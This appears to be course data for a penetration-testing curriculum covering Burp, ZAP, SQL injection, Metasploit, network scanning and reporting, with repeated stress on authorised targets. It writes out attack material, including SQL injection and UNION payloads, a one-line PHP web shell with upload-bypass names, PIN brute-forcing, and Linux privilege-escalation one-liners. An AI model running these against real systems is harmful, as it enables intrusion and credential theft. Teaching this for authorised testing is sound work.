widget.caption: Toggle escaping and see why raw HTML insertion is dangerous.

items.title: Intercept and modify your own login
items.body:
STEP 1 — On your authorised target, turn Proxy → Intercept ON.

STEP 2 — Submit a login form. Burp pauses the request before it leaves your machine.

STEP 3 — Find the username/password fields in the raw request. Change a value (e.g. flip the username) right there in the intercept window, then Forward.

STEP 4 — Watch the server's response to YOUR edited request, not what the browser sent.

YOU SHOULD SEE: the application reacting to the value YOU injected, proving the client never has the final say — the server does, and you sit between them. Turn Intercept back OFF when done (leaving it on pauses all browsing and feels like the internet is broken).

items.title: Client-side checks are theatre
items.body: You just changed a value AFTER the browser's JavaScript validated it. Write down the lesson in one line: any check that runs only in the browser can be bypassed by anyone with a proxy. This is why every real defence has to live on the server.

items.title: Burp Repeater walkthrough (search)
items.creator: various
items.why: See how one request gets sent over and over with small tweaks. Repeater is where you manually probe a single parameter.

items.title: SQL injection — OWASP
items.why: You'll fuzz a parameter for SQLi in Repeater. Read what the classic payloads (' OR 1=1, a single quote) are actually doing to the backend query.

items.title: Hand-fuzz one parameter for SQLi
items.body:
STEP 1 — In HTTP history, find a request with an interesting parameter (a search box, an id in the URL) on your authorised target. Right-click → Send to Repeater.

STEP 2 — In Repeater, send it once unchanged to learn the 'normal' response (status, length, body).

STEP 3 — Change the parameter to a single quote `'` and send. Watch for a 500 error, a SQL error message, or a length change — any of these is a SQLi smell.

STEP 4 — Try `' OR '1'='1` and compare the response to baseline. Note exactly what changed.

YOU SHOULD SEE: a measurable difference (error, different row count, different length) between the clean request and the injected one. Document the request, the payload, and the response delta — that delta is your evidence.

items.title: Burp Intruder — official docs (PortSwigger)
items.why: Intruder fires a payload list at a marked position. Read the four attack types (Sniper, Battering ram, Pitchfork, Cluster bomb) and what each is for.

items.title: Brute-force a 4-digit PIN (on your own target)
items.body:
STEP 1 — On a target you OWN that has a numeric PIN/OTP field, send the verification request to Intruder.

STEP 2 — Clear the auto-markers, then mark ONLY the PIN value as the payload position §...§. Choose Sniper attack type.

STEP 3 — Payloads → Numbers, from 0000 to 9999, step 1, with leading zeros (min 4 digits). That's the whole keyspace of a 4-digit PIN.

STEP 4 — Start the attack. Sort the results by response Length or Status to spot the one that differs.

YOU SHOULD SEE: 9,999 near-identical responses and ONE outlier — the correct PIN, betrayed by a different length or status code. This is exactly why short numeric PINs without rate-limiting are indefensible. Note: Community Edition throttles Intruder; that's fine for learning the workflow.

items.title: What made the brute-force possible
items.body: List the three things that let your attack succeed: a tiny keyspace, no rate limiting, and a response that leaked success via length/status. Now flip each into a defence. That flip — attacker observation to defender control — is the core habit of the whole field.

items.title: OWASP ZAP — getting started
items.why: ZAP is the free, open-source alternative to Burp. Running both on the same target shows you that findings aren't tool-specific — they're real.

items.title: Logger++ and a ZAP active scan
items.body:
STEP 1 — In Burp, open the BApp Store (Extensions tab) and install Logger++. Browse your target; watch Logger++ build a searchable, filterable log of every request across all Burp tools in one table.

STEP 2 — Install OWASP ZAP. Set it to proxy your browser (or use its HUD), and let it spider your authorised target.

STEP 3 — Run ZAP's automated Active Scan against the in-scope target ONLY.

STEP 4 — Compare: does ZAP flag the same parameter you found by hand in Repeater on Day 4? Does it find anything you missed?

YOU SHOULD SEE: overlap between your manual finding and at least one automated alert — confirmation your hand-analysis was real — plus a few extra leads from the scanner. Manual depth + automated breadth is the professional combo.

days.title: Ship it: a real testing workflow

items.title: Run a scoped workflow on a legal target
items.body:
STEP 1 — Pick a target you are EXPLICITLY allowed to test: your own deployed app, a public bug-bounty program whose scope you've read, or a deliberately-vulnerable practice app (OWASP Juice Shop, DVWA) running locally.

STEP 2 — Set Burp scope precisely. Map the app: walk every page with Intercept off so HTTP history fills, then review the sitemap.

STEP 3 — Pick your top 3 most-promising requests (auth, search, anything with an id) and probe each in Repeater. Use Intruder where a list helps. Cross-check with a ZAP active scan.

STEP 4 — Write BURP-FINDINGS.md: for each issue — the request, the payload, the evidence (response delta/screenshot), severity, and a one-line fix. Even 'no issues found on X, here's what I tried' is a valid, professional entry.

YOU SHOULD SEE: a clean, scoped, reproducible report a real team could act on. That document — not the tool clicks — is what the job actually is.

items.title: Ethics check and what's next
items.body: Answer honestly in your README: (1) Every action this week stayed inside an authorised scope — confirm it. (2) Which tool fit which job: when did you reach for Repeater vs Intruder vs ZAP's automated scan? You now have a repeatable workflow; later weeks deepen the specific bug classes you smelled out here.

mastery_questions: Passive scanning watches the traffic flowing through the proxy and analyses it for issues — missing security headers, cookies without HttpOnly, exposed version banners, information leakage in error messages. It generates ZERO new traffic to the target. Active scanning sends additional crafted requests to the target to test for vulnerabilities — fuzz parameters, attempt SQL injection, try XSS payloads, probe for path traversal. Active scanning can generate THOUSANDS of requests per endpoint. Which is safe to run against production? Only passive. Active scanning against production can: trigger rate limits and lock out real users, fill databases with junk data (injection payloads stored as records), crash applications with malformed input, accidentally exploit destructive operations (DELETE/PUT). Active scanning belongs in staging environments only. The compromise some teams make: run Burp's passive scanner against production continuously, then schedule active scans of a production-like staging environment weekly. Never scan production actively without explicit written permission from the system owner — it has been the cause of real outages and real lawsuits.

The OWASP Web Security Testing Guide (WSTG) is the closest thing to a canonical reference for web pentesting. Five vulnerability categories you test in each: (1) Information Gathering — fingerprint the technology stack, find subdomains, archived versions, source code in the page. You're building a target map. (2) Configuration & Deployment Management — test for default credentials, exposed admin panels, debug endpoints (/actuator, /debug, /api-docs), security headers missing (X-Frame-Options, CSP, HSTS). (3) Identity & Authentication — username enumeration, weak password policy, brute force protection, password reset weaknesses, MFA bypass. (4) Session Management — token entropy, session fixation, logout effectiveness, cookie attributes (HttpOnly, Secure, SameSite), CSRF on state-changing requests. (5) Authorisation — IDOR, vertical privilege escalation (user → admin), horizontal privilege escalation (user A → user B), forced browsing to hidden URLs. WSTG has ten more categories — input validation, error handling, crypto, business logic, client-side, API, etc. Every professional pentest works through this list systematically. The mistake juniors make is jumping straight to 'find a bug'. Pros work the list — bugs surface when you do.

Four hours to pentest a web application is a tight timebox — the allocation matters. My split: 30 minutes recon and tech fingerprinting (wappalyzer, subdomain enumeration, robots.txt, sitemap.xml, certificate transparency for related hostnames). 45 minutes mapping the application in Burp (spider every linked page, walk through every form, log out and back in to capture auth flows, list every endpoint and parameter). 30 minutes automated scanning (Burp's passive scanner during browsing, plus a targeted active scan of forms only — not the whole site). That is 1h45 of preparation. The remaining 2h15 is manual testing — testing every form for the OWASP WSTG categories: IDOR by tampering IDs, auth bypass by removing or modifying session tokens, business-logic bugs by stepping through multi-step workflows out of order, file upload bypasses if there's an upload, JWT analysis if tokens are JWT. The split is roughly 30% prep, 60% manual, 10% scanner. The reason juniors flip this to 60% scanner / 30% prep / 10% manual is they trust the scanner more than themselves. Get to the point where the scanner is just confirmation of what you already saw manually.

A scanner reports 'possible SQL injection' at `/search?q=` — confirming whether it is a true positive vs false positive starts with replicating the scanner's payload in Burp Repeater. (1) Send the baseline request: `/search?q=test`. Note the response: HTTP status, content length, time. (2) Send the injection: `/search?q=test'`. Look at the response. If error message contains 'SQL syntax' or 'SQLException' — true positive, confirmed. If the response is identical to baseline — likely false positive. (3) Try a Boolean-based confirmation: `/search?q=test' AND 1=1 --` vs `/search?q=test' AND 1=2 --`. If the response is meaningfully different (different content length, different result count), the database is evaluating your injected logic — true positive. (4) Try a time-based confirmation: `/search?q=test' AND SLEEP(5) --`. If response time is 5+ seconds longer than baseline, true positive. (5) If still uncertain, run sqlmap against the parameter with `-p q --level=5 --risk=3`. The pattern: never trust a scanner's verdict — confirm with two independent techniques (error-based, Boolean-based, time-based, union-based) before writing it in a report.

Burp Intruder is the tool inside Burp Suite for parameter fuzzing — you mark positions in a request, attach a payload set to each position, and Burp sends every combination. Four attack types. (1) Sniper — single payload set, one position at a time. Use when you want to test ONE parameter with MANY values (e.g., test the login username field with a list of usernames). (2) Battering Ram — single payload set, same value substituted into ALL positions simultaneously. Rare; useful when you need the same value in multiple places (e.g., username appears in URL and body). (3) Pitchfork — multiple payload sets, parallel iteration — payload-set-1[i] goes to position-1, payload-set-2[i] goes to position-2 simultaneously. Use for credential testing where you have paired username:password lists (try user1:pass1, user2:pass2, user3:pass3). (4) Cluster Bomb — multiple payload sets, CROSS-PRODUCT — every payload-1 against every payload-2. Use when you want to brute-force username AND password independently (10 users × 100 passwords = 1000 attempts, all combinations tested). Cluster Bomb is the most general and most expensive; Pitchfork is for when the pairing matters; Sniper is the default for single-parameter fuzzing.

common_mistakes: Trusting scanner output without validation — scanners produce false positives. Every finding must be manually confirmed before reporting.
Running active scans against targets you don't own — ZAP Active Scan sends attack payloads. This is illegal on systems without authorisation.

weeks.title: Exploitation — Real Bugs in Real Apps
weeks.context:
Exploitation is where theory meets practice. This week you move beyond finding vulnerabilities and start exploiting them — in controlled lab environments only. You work through PortSwigger Web Security Academy labs, which are the best free hands-on exploitation training available anywhere.

The goal is not to write exploits from scratch. It is to understand how exploitation chains work: one vulnerability becomes the entry point, another escalates privileges, another exfiltrates data. Real attacks are rarely a single CVE — they are a chain.

You also learn Metasploit this week. Metasploit is a framework for running known exploits against known vulnerable targets. It is not a magic hacking button — it is a library of modules that each implement a specific exploit. Understanding why a Metasploit module works is more important than knowing how to run it.

items.title: Prove you understood it
items.body: A SQL injection UNION attack lets you extract data from OTHER tables by combining a second SELECT into the original query's result set. For UNION to work, three conditions must be true. (1) The injection point is in a SELECT statement (UPDATE/DELETE injections need different techniques). (2) You can append `UNION SELECT` to the query — the application returns the results of the SELECT to you (visible somewhere in the response). (3) The two SELECT statements must have the SAME NUMBER of columns and COMPATIBLE column types. Walkthrough: original query is `SELECT name, price FROM products WHERE category = '$input'`. You inject `' UNION SELECT NULL, NULL --` first to confirm two columns. The `--` comments out the closing quote so the query is valid. Then you replace NULLs with the data you want: `' UNION SELECT username, password FROM users --`. The response now shows usernames and passwords next to product names. If the column count is wrong, the database errors out — you increment until matching. If types do not match, NULL works for any type. UNION is the most efficient SQLi exfiltration technique — one request can dump entire tables.

A web shell upload exploit, step by step from file upload to code execution. (1) Identify a file upload endpoint that accepts images (typically profile photo upload, document attachment). (2) Determine what file types the server checks. Many implementations check only the file extension (.jpg, .png). The bypass: rename your malicious file from `shell.php` to `shell.jpg.php` or `shell.php.jpg` depending on what the server parses. (3) Craft the web shell. Minimal PHP web shell: `<?php system($_GET['cmd']); ?>`. Save as `shell.php`. (4) Upload it. If the server validates extension only, upload succeeds. (5) The critical question: where is the file stored, and is it executable from a web URL? If `/uploads/shell.php` is reachable from the browser AND the web server executes .php files in /uploads, you have RCE. Visit `https://target.com/uploads/shell.php?cmd=id` — you get back the output of `id` running as the web server user. (6) From here, attacker upgrades to a full reverse shell, then escalates privileges. The defence is layered: validate by file content (not extension), store uploads outside the web root, serve them through an application controller that sets `Content-Type: application/octet-stream`, never execute uploaded files.

Meterpreter is Metasploit's advanced post-exploitation payload — far more capable than a standard reverse shell. A standard reverse shell is essentially a remote terminal — you get a bash or cmd.exe prompt and run commands one at a time, with no built-in tooling. Meterpreter is an in-memory, encrypted, extensible agent that runs entirely in the exploited process — it never writes a file to disk, defeating most file-based antivirus. It speaks a custom protocol over the network connection that lets the attacker do high-level operations as single Meterpreter commands: `screenshot` captures the screen, `keyscan_start` begins keylogging, `hashdump` extracts password hashes from the registry, `migrate` moves the Meterpreter session into a more stable process (so killing the exploited service does not kill the session), `getsystem` attempts privilege escalation through a built-in catalog of techniques. Each of those is one command vs hours of work in a plain shell. Trade-off: Meterpreter has well-known network signatures and is detected by most EDR products in 2026. Plain reverse shells are noisier to operate but easier to obscure. Red teamers in well-defended environments increasingly use custom C2 frameworks (Sliver, Mythic, Brute Ratel) rather than Meterpreter for that reason.

You exploited a vulnerability and got a low-privilege shell on a Linux box. Three Linux privilege escalation techniques. (1) Kernel exploits — find the kernel version with `uname -a`, search exploit-db for matching kernel CVEs. If the box is on an old kernel (3.x or unpatched 4.x/5.x), public exploits like Dirty COW (CVE-2016-5195) or DirtyPipe (CVE-2022-0847) often give instant root. Run `searchsploit linux kernel 4.4` to find candidates. (2) SUID misconfigurations — SUID binaries run as their owner regardless of who invokes them. `find / -perm -4000 2>/dev/null` lists every SUID binary. If any non-standard binary is SUID root (especially `find`, `nmap`, `vim`, `nano`, `cp`, `python`, `bash`) — GTFOBins (gtfobins.github.io) has a one-liner for each that escalates to root. Example: SUID `vim` → `vim -c ':!/bin/sh'` opens a root shell. (3) Cron jobs running as root — `cat /etc/crontab` and `ls -la /etc/cron.*` show scheduled root jobs. If a root-cron-job script is writable by your user, edit it to spawn a root shell on next execution. Common pattern: a root cron runs `/opt/backup.sh` every minute, and /opt is world-writable. Replace the script. Wait 60 seconds. Root.

An exploit chain is when an attacker combines multiple vulnerabilities — none of which alone gives them what they want — into a sequence that achieves full compromise. Real example using publicly-disclosed CVEs: the 2021 ProxyShell chain in Microsoft Exchange. Three CVEs chained: (1) CVE-2021-34473 (Microsoft Exchange Server-Side Request Forgery) — lets an unauthenticated attacker make Exchange send HTTP requests to itself, bypassing the front-end authentication check. (2) CVE-2021-34523 (Privilege Elevation) — once past the front-end, the attacker can impersonate any Exchange user including the system mailbox 'SM_' accounts. (3) CVE-2021-31207 (Arbitrary File Write) — as a privileged user, the attacker uses Exchange's New-MailboxExportRequest cmdlet to write a web shell to the IIS web root. Outcome: unauthenticated remote attacker → web shell on the Exchange server → full domain controller compromise. None of the three CVEs alone is critical — one is auth bypass on a single endpoint, one is impersonation only after auth, one is file write only after privileged auth. Chained, they are a Critical RCE that hit thousands of organisations. The lesson: defenders cannot triage by individual CVSS scores — the chained risk is the real risk, and chains are why patching everything matters even when individual CVEs look low.

common_mistakes: Running Metasploit against real targets — Metasploit modules send exploit payloads. Running them against anything you don't own is a crime.
Not understanding the exploit before running it — 'use, set RHOSTS, run' is not learning. Read the module source (show info, less modules/...) and understand what it does.
Confusing payload and exploit — the exploit gets you code execution; the payload is what runs after. Meterpreter, reverse shell, bind shell are payloads.
Ignoring post-exploitation — getting a shell is not the end. A professional pentester documents what they can access from that shell: files, credentials, network access.
Not cleaning up — in real engagements, you remove web shells and reverse shells after testing. In labs, always reset the machine when done.

weeks.title: Network and Service Pentesting
weeks.context:
Web applications are one attack surface. Networks and services are another. This week you learn to audit networks and services: scanning, fingerprinting, and exploiting common service misconfigurations.

Every open port is an attack surface. SSH, FTP, SMTP, RDP, SMB, databases — each service has known vulnerabilities, default credentials, and misconfigurations that attackers look for. A real pentest starts with a full port scan of the target network, then service fingerprinting, then research on each service version for known CVEs.

You also learn Nessus or OpenVAS this week — professional vulnerability scanners used in real engagements. These are different from Burp/ZAP (which are web-only); network scanners evaluate every open service for known vulnerabilities.

SMB enumeration — enum4linux, smbclient, accessing shares
SSH — key-based brute force, exploit weak configs
Active Directory basics — domains, OUs, GPOs, common misconfigs
Kerberos attacks — ASREPRoasting, Kerberoasting, pass-the-ticket
Lateral movement — psexec, WMI, PSRemoting
Privilege escalation on Linux + Windows — kernel exploits, misconfigured sudo

items.title: Prove you understood it
items.body: A SYN scan (`nmap -sS`) and a full connect scan (`nmap -sT`) differ in how nmap completes the TCP handshake. TCP normally goes SYN → SYN/ACK → ACK to open a connection. A SYN scan sends the initial SYN, receives SYN/ACK if the port is open or RST if closed, and then sends RST to abort instead of completing the handshake. The target's application layer never sees the connection — so the target may not log the probe. The SYN scan is faster and stealthier. A full connect scan (`-sT`) completes the three-way handshake (SYN → SYN/ACK → ACK), opens a real TCP connection, then immediately closes it. The target's application accepts the connection, logs it, and you appear in the server logs. When to use each: use `-sS` (default) when you have raw socket permissions (root/admin on the scanner machine) — it requires raw sockets to craft the SYN packets directly. Use `-sT` when you do not have raw socket access (running as a normal user) — it uses the OS's connect() system call which works without privileges. Practical: `-sS` is the default and what you use 95% of the time. `-sT` is fallback when you're in a restricted environment.

Port 21 (FTP) open on a target — the first three things to test. (1) Anonymous login: `ftp <target>`, username `anonymous`, password `anonymous@` (or any email). If accepted, list files with `ls -la` — anonymous-readable FTP frequently exposes backup files, source code, configuration files. Real bug bounties have been paid for finding anonymous FTP with database backups in the root. (2) Banner grab — nmap's `-sV` already showed the version, but run `nc <target> 21` to see the raw banner. Old versions of vsftpd (specifically 2.3.4) have a backdoor (CVE-2011-2523) — connect with username ending in `:)` and a connection opens on port 6200 with root shell. ProFTPD 1.3.5 has CVE-2015-3306 — file copy gives RCE. Always identify the exact version and search exploit-db. (3) Default credentials — try `admin/admin`, `root/root`, `ftp/ftp`, and the target's company name as username with common passwords. FTP is often used for legacy file transfers and often has weak credentials that the admin team forgot existed. Bonus 4th if anonymous works: check write access — `put test.txt`. If you can upload, in combination with a web server on the same host, you may have an RCE chain (upload web shell, execute via HTTP).

SMB (Server Message Block) is the file-sharing protocol used by Windows networks — file shares, printer sharing, named pipes, inter-process communication. It is historically high-risk because it was designed in the 1980s for trusted LANs, then extended into the internet era without rethinking the trust model. Several major SMB CVEs. (1) MS08-067 (CVE-2008-4250) — Server Service vulnerability that allowed remote code execution without authentication. This is the CVE that the Conficker worm used to infect 9 million Windows machines in 2008. Patched, but still found in unpatched legacy systems. (2) MS17-010 / EternalBlue (CVE-2017-0144) — SMBv1 remote code execution discovered by the NSA, leaked by the Shadow Brokers in 2017, then weaponised by WannaCry and NotPetya. Infected hundreds of thousands of machines globally including the UK NHS. Even in 2026, hospitals and industrial sites are still running SMBv1 because of legacy device dependencies. (3) PrintNightmare (CVE-2021-34527) — Print Spooler privilege escalation, related to SMB-style RPC. The defender's response: disable SMBv1 globally, require SMB signing, block port 445 at the perimeter, patch aggressively. SMB is also the protocol behind the most common Active Directory attacks (pass-the-hash, NTLM relay) — which is why AD pentesting starts with SMB.

A vulnerability scanner (Nessus, OpenVAS, Qualys) automatically scans a network or system for known vulnerabilities by matching service banners, configurations, and probe responses against a database of CVEs. It is fast, thorough on known issues, and produces a report. A penetration test is a human attacker working systematically through scoping, recon, exploitation, post-exploitation, and reporting, finding chained business-logic bugs and validating exploitability. Can one replace the other? No. Scanner finds known unpatched CVEs and obvious misconfigurations — invaluable for compliance and baseline hygiene. It misses: business-logic flaws (the workflow that lets a user discount themselves to free), authorization bypasses (the IDOR that scanners cannot guess), zero-days, chained vulnerabilities, social engineering risk, physical security. A pentester finds those. Conversely, a pentest is expensive and time-bounded — a 5-day pentest cannot scan every host in a 10,000-host network for every CVE. Best practice: continuous automated scanning for known issues, periodic deep pentests for the depth scanners cannot reach. Most regulations (PCI-DSS, ISO 27001, SOC 2) explicitly require both because they solve different problems. The mistake organisations make is buying one scanner and calling it 'we have penetration testing'.

A service banner is the text a service returns when you connect to it that identifies the software and often its exact version. Example: connecting to port 22 (SSH) on a fresh server returns `SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6`. From that single line, an attacker knows: it's OpenSSH, version 8.9p1, on Ubuntu 22.04 specifically (the `3ubuntu0.6` is the distribution patch level). They can now search CVE databases for known issues in that exact version and craft targeted exploits without sending any probes that might trigger detection. Equivalent for HTTP: `Server: Apache/2.4.41 (Ubuntu)` or PHP's `X-Powered-By: PHP/7.4.3`. Service version information is the attacker's research starting point. How a defender reduces banner leakage: SSH — set `Banner /etc/issue.net` in sshd_config and put generic text in /etc/issue.net (some operators replace the banner entirely; OpenSSH does not let you fully hide the version, but you can suppress the OS info). Apache — `ServerTokens Prod` and `ServerSignature Off` in the config strip versions from the Server header and error pages. PHP — `expose_php = Off` in php.ini removes the X-Powered-By. None of these are security through obscurity in a real sense — a determined attacker can still fingerprint via behaviour. But they raise the cost of recon enough to deflect automated scanners that index the internet by banner.

**OpenVAS (open-source alternative):**
```bash

```

**Network scanning with nmap:**
```bash
# Full port scan (slow but thorough)
nmap -p- -T4 <target-ip>
# Service and version detection
nmap -sV -sC -p 22,80,443,3306 <target-ip>
# OS detection (requires root)
sudo nmap -O <target-ip>
# Output to file
nmap -oN scan.txt -oX scan.xml <target-ip>
```

Default credentials: msfadmin / msfadmin
common_mistakes: Only scanning common ports — attackers scan all 65535 ports. Running services on non-standard ports is security through obscurity, not security.
Treating Nessus output as a pentest report — a vulnerability scan is a list of potential issues. A pentest confirms which ones are actually exploitable.
Not checking for default credentials — 'admin/admin', 'root/root', 'guest/guest' still work on thousands of exposed services. Always check.
Missing UDP services — nmap defaults to TCP. Services like DNS (53/UDP), SNMP (161/UDP), and TFTP (69/UDP) require nmap -sU.
Ignoring old/unpatched service versions — nmap -sV shows you the version. Search that version in CVE database immediately.

**nmap scan too slow?**
```bash
# Adjust timing template (T1=slow, T5=fast/loud)
nmap -T4 -p- <target-ip>
# Skip host discovery if you know the host is up
nmap -Pn -p- <target-ip>
```

**Nessus won't start?**
```bash
# Linux/macOS
sudo systemctl start nessusd
# Check status
sudo systemctl status nessusd
# Access at: https://localhost:8834
```

**Can't connect to FTP on Metasploitable?**
```bash
ftp <target-ip>
# If connection refused, confirm FTP port is open
nmap -p 21 <target-ip>
# Try anonymous login
ftp> anonymous
ftp> anonymous@
```

weeks.title: Reporting and Communication — The Skill That Pays
weeks.context:
Finding vulnerabilities is 40% of a pentester's job. Communicating them clearly is the other 60%. A security finding that the engineering team cannot understand and act on is worthless. This week you learn to write professional penetration test reports.

A professional pentest report has two sections: an executive summary (for leadership, non-technical, focused on business risk) and a technical findings section (for developers, specific reproduction steps, code-level remediation). You need to write both.

You also learn to triage findings by risk. Not everything is Critical. Severity is based on CVSS; risk is based on severity + likelihood + business impact. A CVSS 9.8 vulnerability on an internal system with no external access has lower risk than a CVSS 6.0 vulnerability on a public-facing payment page.
